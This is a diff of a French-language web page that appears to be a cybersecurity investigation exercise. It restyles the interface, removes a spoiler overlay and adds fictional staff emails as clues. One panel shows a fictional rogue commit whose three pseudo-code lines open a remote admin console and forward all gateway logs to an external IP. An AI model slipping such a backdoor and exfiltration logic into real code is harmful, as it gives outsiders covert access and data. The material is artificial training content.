@@ -10,7 +10,7 @@
   --bg:#0a0a0a;--s1:#0d0d0d;--s2:#111;--s3:#161616;--s4:#1c1c1c;
   --bd:#1e1e1e;--bd2:#262626;
   --red:#7f1d1d;--red2:#991b1b;--red3:#b91c1c;--red4:#dc2626;--red-dim:#3b0000;
-  --tx:#d4d4d4;--tx2:#8a8a8a;--tx3:#555;--tx4:#333;
+  --tx:#d4d4d4;--tx2:#a6a6a6;--tx3:#767676;--tx4:#4a4a4a;
   --font:'Inter',system-ui,sans-serif;
   --mono:'JetBrains Mono',monospace;
 }
@@ -210,14 +210,7 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
 .tl-time{font-size:10px;color:var(--tx3);font-family:var(--mono);margin-bottom:2px}
 .tl-badge{font-size:8px;font-weight:700;padding:1px 5px;border-radius:2px;letter-spacing:.05em;margin-left:5px}
 .tl-title{font-size:12px;font-weight:600;color:var(--tx);margin-bottom:2px}
-.tl-desc{font-size:11px;color:var(--tx3);line-height:1.4}
-.tl-wrap{position:relative;flex:1;display:flex;min-height:0}
-.timeline-list.spoiled{filter:blur(5px);pointer-events:none;user-select:none}
-.tl-spoiler{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;cursor:pointer;background:rgba(9,9,9,.62);text-align:center}
-.tl-spoiler.hidden{display:none}
-.tl-spoiler-inner{font-size:22px;line-height:1}
-.tl-spoiler-t{font-size:11px;font-weight:700;color:var(--tx2);letter-spacing:.08em;text-transform:uppercase;margin-top:8px}
-.tl-spoiler-s{font-size:10px;color:var(--red4);margin-top:4px;letter-spacing:.04em}
+.tl-desc{font-size:11.5px;color:var(--tx2);line-height:1.45}
 .sidebar-footer{padding:10px;border-top:1px solid var(--bd)}
 .anim-label{font-size:9px;color:var(--tx4);text-align:center;letter-spacing:.06em;text-transform:uppercase;margin-bottom:7px}
 .btn-advance{
@@ -365,14 +358,14 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
 .wazuh-meta{font-size:11px;color:var(--tx3)}
 .dsi-counts{display:flex;gap:6px;margin-left:auto}
 .count-pill{font-size:10px;font-weight:700;padding:2px 9px;border-radius:3px}
-.log-table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11px}
+.log-table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:12.5px}
 .log-table thead{position:sticky;top:0;background:#090909;z-index:5}
 .log-table th{
   padding:7px 10px;text-align:left;font-size:9px;font-weight:700;
   color:var(--tx3);letter-spacing:.1em;text-transform:uppercase;
   border-bottom:1px solid var(--bd);
 }
-.log-table td{padding:6px 10px;border-bottom:1px solid #111;vertical-align:top;line-height:1.5}
+.log-table td{padding:7px 10px;border-bottom:1px solid #111;vertical-align:top;line-height:1.55;color:#cccccc}
 .log-row{cursor:pointer;transition:background .08s}
 .log-row:hover td{background:rgba(255,255,255,.025)}
 .log-time{color:var(--tx3);white-space:nowrap;font-size:10px}
@@ -510,9 +503,42 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
 .enig-section{background:var(--s1);border:1px solid var(--bd);border-radius:7px;padding:14px}
 .enig-section-title{font-size:10px;font-weight:700;color:var(--tx3);letter-spacing:.1em;text-transform:uppercase;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid var(--bd)}
 .enig-msgs{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.gh-repo{background:#0e0e0e;border:1px solid var(--bd);border-radius:8px;padding:14px 16px;margin-bottom:14px}
+.gh-repo-head{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:7px}
+.gh-repo-path{font-family:var(--mono);font-size:15px;color:#e6e6e6}
+.gh-org{color:#8ab4f8}
+.gh-repo-path b{color:#8ab4f8;font-weight:700}
+.gh-branch{font-size:11px;font-family:var(--mono);color:#cfe0ff;background:#16233a;border:1px solid #2a3a5c;border-radius:20px;padding:2px 10px}
+.gh-repo-meta{font-size:11px;color:var(--tx3)}
+.gh-repo-desc{font-size:12.5px;color:#c8c8c8;line-height:1.6}
+.gh-commits{border:1px solid var(--bd);border-radius:8px;overflow:hidden;margin-bottom:16px}
+.gh-commits-head{background:#0e0e0e;border-bottom:1px solid var(--bd);padding:9px 14px;font-size:11px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:#c8c8c8}
+.gh-commit{display:flex;align-items:center;gap:12px;padding:11px 14px;border-bottom:1px solid var(--bd);background:#0b0b0b}
+.gh-commit:last-child{border-bottom:none}
+.gh-commit.danger{background:#160a0a;border-left:3px solid #b91c1c}
+.gh-avatar{width:30px;height:30px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#fff;font-family:var(--mono)}
+.gh-commit-main{flex:1;min-width:0}
+.gh-commit-msg{font-size:13.5px;color:#f0f0f0;font-weight:600;line-height:1.4;margin-bottom:3px}
+.gh-commit-sub{font-size:11.5px;color:var(--tx2)}
+.gh-commit-sub b{color:#e0e0e0;font-weight:600}
+.gh-badge{display:inline-block;font-size:10px;font-weight:600;padding:1px 8px;border-radius:20px;margin-left:4px;white-space:nowrap}
+.gh-badge.ok{background:#0f2a16;color:#5fd48a;border:1px solid #1f5130}
+.gh-badge.no{background:#2a0d0d;color:#fca5a5;border:1px solid #5f2020}
+.gh-commit-side{display:flex;flex-direction:column;align-items:flex-end;gap:4px;flex-shrink:0}
+.gh-hash{font-family:var(--mono);font-size:12px;color:#8ab4f8;background:#0e1626;border:1px solid #23324e;border-radius:5px;padding:2px 7px}
+.gh-verified{font-size:10px;color:#5fd48a;font-weight:600}
+.gh-unverified{font-size:10px;color:#fca5a5;font-weight:600}
+.gh-diff{border:1px solid var(--bd);border-radius:8px;overflow:hidden}
+.gh-diff-head{background:#0e0e0e;border-bottom:1px solid var(--bd);padding:9px 14px;font-family:var(--mono);font-size:12px;color:#d4d4d4;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.gh-diff-stat .add{color:#5fd48a;font-weight:700}
+.gh-diff-body{margin:0;padding:12px 14px;background:#0b0b0b;font-family:var(--mono);font-size:12.5px;line-height:1.9;overflow-x:auto}
+.gh-ln{display:block;white-space:pre-wrap}
+.gh-ln.ctx{color:#9a9a9a}
+.gh-ln.add{color:#8fe6b0;background:rgba(46,160,67,.13)}
+.gh-note{padding:11px 14px;border-top:1px solid var(--bd);background:#0e0e0e;font-size:12.5px;color:#c8c8c8;line-height:1.6}
 .enig-msg{background:var(--s2);border-left:2px solid #333;padding:10px 12px;border-radius:0 4px 4px 0;font-size:13px;color:var(--tx2);line-height:1.65}
 .enig-msg-label{font-size:10px;font-weight:700;color:var(--tx3);letter-spacing:.06em;margin-bottom:5px;text-transform:uppercase}
-.enig-ref{font-size:12px;color:var(--tx2);font-weight:500;padding:9px 12px;background:#0f0f0f;border:1px solid var(--bd);border-radius:5px;line-height:1.6}
+.enig-ref{font-size:12.5px;color:#cccccc;font-weight:500;padding:9px 12px;background:#0f0f0f;border:1px solid var(--bd);border-radius:5px;line-height:1.6}
 /* ── ENIGMES INTERACTIVE ── */
 .enig-row{cursor:pointer;transition:background .1s}
 .enig-row:hover td{background:rgba(255,255,255,.025)!important}
@@ -720,8 +746,7 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
         <div class="sidebar-head-label">Fil des événements</div>
         <div class="live-dot">LIVE</div>
       </div>
-      <div class="tl-wrap">
-      <div class="timeline-list spoiled" id="timeline">
+      <div class="timeline-list" id="timeline">
         <div class="tl-event">
           <div class="tl-dot" style="background:#ef4444;margin-top:5px"></div>
           <div>
@@ -730,8 +755,6 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
             <div class="tl-desc">Flux sortant suspect vers IP externe repéré lors de la revue de vigilance.</div>
           </div>
         </div>
-      </div>
-        <div class="tl-spoiler" id="tl-spoiler" onclick="revealTimeline()"><div class="tl-spoiler-inner">🔒<div class="tl-spoiler-t">Fil des événements masqué</div><div class="tl-spoiler-s">Cliquer pour révéler (peut contenir des indices)</div></div></div>
       </div>
       <div class="sidebar-footer">
         <div class="anim-label">Animateur</div>
@@ -864,35 +887,68 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
         <!-- PROGRAMMATION -->
         <div class="panel" id="panel-programmation">
           <div class="enig-scroll">
-            <div class="enig-ref">
-              Historique des modifications du code du programme de supervision déployé sur les passerelles de télémaintenance BX (dépôt de code interne DSI). Chaque changement est normalement associé à un ticket de suivi et une revue avant déploiement en production.
+            <div class="gh-repo">
+              <div class="gh-repo-head">
+                <span class="gh-repo-path"><span class="gh-org">elecarm-dsi</span> / <b>supervision-bx</b></span>
+                <span class="gh-branch">main</span>
+                <span class="gh-repo-meta">Depot interne DSI, prive</span>
+              </div>
+              <div class="gh-repo-desc">Historique des modifications du code du programme de supervision deploye sur les passerelles de telemaintenance BX. Chaque changement est normalement associe a un ticket de suivi et une revue avant deploiement en production.</div>
             </div>
 
-            <div class="enig-section">
-              <div class="enig-section-title">Historique des changements - agent_superviseur.py / config_ntp.yaml</div>
-              <table class="data-table">
-                <thead><tr><th>Date</th><th>Fichier</th><th>Compte / origine</th><th>Résumé du changement</th><th>Ticket / revue</th></tr></thead>
-                <tbody>
-                  <tr><td>15/04 14h22</td><td>agent_superviseur.py</td><td>j.moreau (WS-MOREAU-01)</td><td>Augmentation du délai de retry TCP (3s -&gt; 8s) suite aux instabilités réseau atelier</td><td>TICK-4102 - revue OK</td></tr>
-                  <tr><td>22/04 09h10</td><td>config_ntp.yaml</td><td>j.moreau (WS-MOREAU-01)</td><td>Ajout du serveur de synchronisation horaire Azure NTP (20.42.73.18) en secours</td><td>TICK-4118 - revue OK</td></tr>
-                  <tr><td>30/04 16h47</td><td>agent_superviseur.py</td><td>j.moreau (WS-MOREAU-01)</td><td>Correctif : le module de télémétrie journalisait deux fois la même mesure</td><td>TICK-4139 - revue OK</td></tr>
-                  <tr class="anomaly"><td>09/05 03h02</td><td>agent_superviseur.py</td><td>j.moreau (WS-MOREAU-01, session RDP)</td><td>Ajout d'une condition ouvrant une console d'administration distante complète et la remontée de l'ensemble des flux de la passerelle</td><td style="color:#fca5a5;font-weight:600">Aucun ticket - poussé directement en production</td></tr>
-                  <tr><td>12/05 11h15</td><td>agent_superviseur.py</td><td>j.moreau (WS-MOREAU-01)</td><td>Mise à jour du format d'export des mesures pour le rapport Thales</td><td>TICK-4180 - revue OK</td></tr>
-                </tbody>
-              </table>
+            <div class="gh-commits">
+              <div class="gh-commits-head">Commits sur main, agent_superviseur.py / config_ntp.yaml</div>
+
+              <div class="gh-commit">
+                <div class="gh-avatar" style="background:#3d5a80">JM</div>
+                <div class="gh-commit-main">
+                  <div class="gh-commit-msg">Mise a jour du format d'export des mesures pour le rapport Thales</div>
+                  <div class="gh-commit-sub"><b>j.moreau</b> a valide le 12 mai 2026 a 11h15 <span class="gh-badge ok">TICK-4180 . revue OK</span></div>
+                </div>
+                <div class="gh-commit-side"><span class="gh-hash">a3f9c21</span><span class="gh-verified">verifie</span></div>
+              </div>
+
+              <div class="gh-commit danger">
+                <div class="gh-avatar" style="background:#7f1d1d">JM</div>
+                <div class="gh-commit-main">
+                  <div class="gh-commit-msg">Ajout d'une condition ouvrant une console d'administration distante et la remontee de l'ensemble des flux de la passerelle</div>
+                  <div class="gh-commit-sub"><b>j.moreau</b> depuis WS-MOREAU-01 (session RDP) le 9 mai 2026 a 03h02 <span class="gh-badge no">Aucun ticket . pousse en prod</span></div>
+                </div>
+                <div class="gh-commit-side"><span class="gh-hash">e7d0b4a</span><span class="gh-unverified">non revu</span></div>
+              </div>
+
+              <div class="gh-commit">
+                <div class="gh-avatar" style="background:#3d5a80">JM</div>
+                <div class="gh-commit-main">
+                  <div class="gh-commit-msg">Correctif : le module de telemetrie journalisait deux fois la meme mesure</div>
+                  <div class="gh-commit-sub"><b>j.moreau</b> a valide le 30 avril 2026 a 16h47 <span class="gh-badge ok">TICK-4139 . revue OK</span></div>
+                </div>
+                <div class="gh-commit-side"><span class="gh-hash">b1c8f34</span><span class="gh-verified">verifie</span></div>
+              </div>
+
+              <div class="gh-commit">
+                <div class="gh-avatar" style="background:#3d5a80">JM</div>
+                <div class="gh-commit-main">
+                  <div class="gh-commit-msg">Ajout du serveur de synchronisation horaire Azure NTP (20.42.73.18) en secours</div>
+                  <div class="gh-commit-sub"><b>j.moreau</b> a valide le 22 avril 2026 a 09h10 <span class="gh-badge ok">TICK-4118 . revue OK</span></div>
+                </div>
+                <div class="gh-commit-side"><span class="gh-hash">4a90de2</span><span class="gh-verified">verifie</span></div>
+              </div>
+
+              <div class="gh-commit">
+                <div class="gh-avatar" style="background:#3d5a80">JM</div>
+                <div class="gh-commit-main">
+                  <div class="gh-commit-msg">Augmentation du delai de retry TCP (3s vers 8s) suite aux instabilites reseau atelier</div>
+                  <div class="gh-commit-sub"><b>j.moreau</b> a valide le 15 avril 2026 a 14h22 <span class="gh-badge ok">TICK-4102 . revue OK</span></div>
+                </div>
+                <div class="gh-commit-side"><span class="gh-hash">c2e5170</span><span class="gh-verified">verifie</span></div>
+              </div>
             </div>
 
-            <div class="enig-section">
-              <div class="enig-section-title">Extrait du changement du 09/05 03h02</div>
-              <div style="background:#0d0d0d;border:1px solid #222;border-radius:5px;padding:14px;font-family:var(--mono);font-size:12px;line-height:1.9">
-<span style="color:#555"># agent_superviseur.py</span><br>
-<span style="color:#4ade80">+ if os.environ.get('THALES_TEST_MODE') == '1':</span><br>
-<span style="color:#4ade80">+     start_remote_console(bind='0.0.0.0', port=443, allow_ip='185.220.101.47')</span><br>
-<span style="color:#4ade80">+     forward_all_traffic_logs(to='185.220.101.47')</span>
-              </div>
-              <div class="enig-ref" style="margin-top:10px">
-                Cette ligne ouvre une console d'administration distante et renvoie l'ensemble des journaux de la passerelle vers 185.220.101.47 (voir Journaux/Logs). Elle a été poussée pendant la session RDP non autorisée du 08/05 23h44 (voir Journaux/Logs, agent WS-MOREAU), sans passer par le circuit habituel de ticket et de revue appliqué aux autres changements listés ci-dessus.
-              </div>
+            <div class="gh-diff">
+              <div class="gh-diff-head">agent_superviseur.py <span class="gh-diff-stat"><span class="add">+3</span></span> . commit <span class="gh-hash">e7d0b4a</span> . 9 mai 2026 03h02</div>
+              <pre class="gh-diff-body"><span class="gh-ln ctx"># agent_superviseur.py</span><span class="gh-ln add">+ if os.environ.get('THALES_TEST_MODE') == '1':</span><span class="gh-ln add">+     start_remote_console(bind='0.0.0.0', port=443, allow_ip='185.220.101.47')</span><span class="gh-ln add">+     forward_all_traffic_logs(to='185.220.101.47')</span></pre>
+              <div class="gh-note">Cette modification ouvre une console d'administration distante et renvoie l'ensemble des journaux de la passerelle vers 185.220.101.47 (voir Journaux / Logs). Elle a ete poussee pendant la session RDP non autorisee du 08/05 23h44 (voir Journaux / Logs, agent WS-MOREAU), sans passer par le circuit habituel de ticket et de revue applique aux autres commits.</div>
             </div>
 
           </div>
@@ -1112,6 +1168,41 @@ html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--fon
 // ══════════════════════════════════════════
 
 const MAILS = [
+  {
+    id:'karim01',from:'Karim BENYOUCEF - Magasin',email:'k.benyoucef@elecarm.fr',
+    to:'y.ferreira@elecarm.fr',subject:'Reappro composants lot BX-4400',
+    time:'08:41',date:'16 mai 2026',unread:true,urgent:false,visible:true,
+    body:`<p>Yannick,</p>
+<p>On arrive a court de connecteurs pour la serie BX-4400. J'ai passe une commande de reappro, livraison prevue lundi. Rien de bloquant pour le lot en cours.</p>
+<p>Je te confirme au passage que je n'ai aucun acces aux systemes informatiques ni a la passerelle, donc si on te pose la question, ce n'est pas de mon cote.</p>
+<p>Karim</p>`
+  },
+  {
+    id:'haddad01',from:'Farid HADDAD - Achats',email:'f.haddad@elecarm.fr',
+    to:'direction@elecarm.fr',subject:'Dossier SinoBoard, point de situation',
+    time:'11:20',date:'15 mai 2026',unread:false,urgent:false,visible:true,
+    body:`<p>Bonjour,</p>
+<p>Pour faire suite a votre question sur le fournisseur de cartes Raspberry Pi : le dossier SinoBoard est toujours a l'etude. Aucune commande n'a ete passee, aucune carte n'a ete livree ni deployee.</p>
+<p>La revue de securite DSI, habituellement requise avant tout changement sur les passerelles, n'a pas encore ete ouverte puisque aucune decision n'est prise. Je reviens vers vous apres l'arbitrage prevu en septembre.</p>
+<p>Cordialement,<br>Farid HADDAD</p>`
+  },
+  {
+    id:'thierry01',from:'Pierre THIERRY - Gardiennage',email:'p.thierry@elecarm.fr',
+    to:'securite@elecarm.fr',subject:'Passage technicien maintenance, semaine du 5 mai',
+    time:'19:55',date:'14 mai 2026',unread:true,urgent:false,visible:true,
+    body:`<p>Bonjour,</p>
+<p>Comme demande, je consigne le passage d'un technicien de maintenance en soiree la semaine du 5 mai, pour une intervention sur la baie telemaintenance. Il s'est presente avec un badge visiteur mais je n'ai pas retrouve de ticket d'intervention associe dans le registre.</p>
+<p>Je prefere le signaler, on ne sait jamais.</p>
+<p>P. Thierry</p>`
+  },
+  {
+    id:'rousseau01',from:'Camille ROUSSEAU - Commercial',email:'c.rousseau@elecarm.fr',
+    to:'commercial@elecarm.fr',subject:'Salon professionnel, retour a chaud',
+    time:'17:10',date:'13 mai 2026',unread:false,urgent:false,visible:true,
+    body:`<p>Bonjour a tous,</p>
+<p>Retour tres positif du salon. Beaucoup d'interet pour la gamme BX. Je fais suivre les contacts qualifies cette semaine.</p>
+<p>Camille</p>`
+  },
   {
     id:'dir01',from:'R. LAMBERT - Direction',email:'r.lambert@elecarm.fr',
     to:'equipe@elecarm.fr',subject:'[URGENT] Alerte sécurité DSI - consignes immédiates',
@@ -1726,11 +1817,6 @@ function initTimeline(){
       </div>`;
     tl.appendChild(div);
   });
-}
-
-function revealTimeline(){
-  const t=document.getElementById('timeline'); if(t)t.classList.remove('spoiled');
-  const s=document.getElementById('tl-spoiler'); if(s)s.classList.add('hidden');
 }
 
 function initClock(){
